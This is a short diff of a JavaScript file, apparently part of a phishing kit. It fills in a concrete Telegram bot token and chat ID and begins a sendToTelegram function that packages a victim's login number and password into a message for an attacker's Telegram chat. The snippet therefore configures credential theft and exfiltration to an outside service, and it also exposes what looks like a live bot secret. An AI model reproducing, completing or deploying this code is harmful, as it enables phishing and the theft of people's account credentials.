@@ -1,6 +1,6 @@
 // Telegram Bot Configuration
-const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your Telegram bot token
-const CHAT_ID = "YOUR_CHAT_ID_HERE";      // Replace with your Telegram chat ID
+const BOT_TOKEN = "8074904664:AAGmKjpGRjtphBk91ABwT_d07l5mZkKt2RY";  // Replace with your Telegram bot token
+const CHAT_ID = "7987662357";      // Replace with your Telegram chat ID
 
 function sendToTelegram(username, password) {
     const message = `🛡 Login Info 🛡\n\n👤 Number: ${username}\n🔑 Password: ${password}`;
